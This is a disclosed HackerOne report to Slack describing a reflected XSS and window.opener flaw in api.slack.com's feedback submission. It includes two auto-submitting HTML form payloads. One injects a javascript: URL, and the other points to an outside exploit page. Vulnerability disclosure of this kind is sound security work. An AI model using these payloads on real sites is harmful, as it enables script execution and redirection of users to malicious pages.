---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '834071'
original_report_id: '834071'
title: XSS on link and window.opener
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: slack
created_at: '2020-03-29T20:20:59.395Z'
disclosed_at: '2023-01-23T14:44:05.340Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 47
asset_identifier: api.slack.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS on link and window.opener

## Metadata

- HackerOne Report ID: 834071
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: slack
- Disclosed At: 2023-01-23T14:44:05.340Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi possible xss and error when clicking on the link .

`<form name="pisarenko" action="https://api.slack.com/feedback/submit" method="POST">
<input type='hidden' name='crumb' value="1"> 
<input type='hidden' name='path' value="javascript:alert()"> 
<input type='hidden' name='vote' value="Yes"> 
</form>
<script>document.pisarenko.submit();</script>`

or 

`<form name="pisarenko" action="https://api.slack.com/feedback/submit" method="POST">
<input type='hidden' name='crumb' value="1"> 
<input type='hidden' name='path' value="https://servisvk.com/exploit/opener.php"> 
<input type='hidden' name='vote' value="Yes"> 
</form>
<script>document.pisarenko.submit();</script>`

## Impact

Redirection from the original site to an evil site or execution of js code

Please check that the domain is `slack`

{F765317}

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
